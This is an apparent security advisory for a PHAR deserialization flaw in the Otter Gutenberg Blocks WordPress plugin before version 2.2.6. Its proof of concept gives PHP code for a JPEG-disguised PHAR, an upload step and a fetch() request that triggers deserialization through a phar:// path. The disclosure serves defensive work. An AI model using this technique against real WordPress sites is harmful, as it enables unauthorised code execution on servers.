## WordPress Plugin Vulnerabilities

# Otter - Gutenberg Blocks < 2.2.6 - Author+ PHAR Deserialization

### Description

The plugin does not sanitize some user-controlled file paths before performing file operations on them. This leads to a PHAR deserialization vulnerability on PHP < 8.0 using the phar:// stream wrapper.

### Proof of Concept

Please note that the following proof-of-concept requires WordPress to be running a PHP version previous to 8.0.
1. Create a PHAR file using the following PHP code in the `create\_phar.php` file, and the command `php --define phar.readonly=0 create\_phar.php`.
<?php
class Evil {}
// create new Phar
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.png', 'text');
$phar->setStub("\xff\xd8\xff\n<?php \_\_HALT\_COMPILER(); ?>");
$phar->setMetadata(new Evil());
$phar->stopBuffering();
2. As an Author user, upload the `poc.phar.jpg` file. Note its path on the server (e.g. `/wp-content/uploads/2023/04/poc.phar\_.jpg`).
3. Create a simulated gadget on the server with the following code:
class Evil {
function \_\_wakeup() {
die('Arbitrary deserialization');
}
}
4. Trigger the deserialization with the following code in the browser console (with the correct path to the .phar file on your server):
fetch("/wp-json/otter/v1/dynamic?type=author&uid=1234&context=somecontext&fallback=phar://wp-content/uploads/2023/04/poc.phar\_.jpg/test.txt")
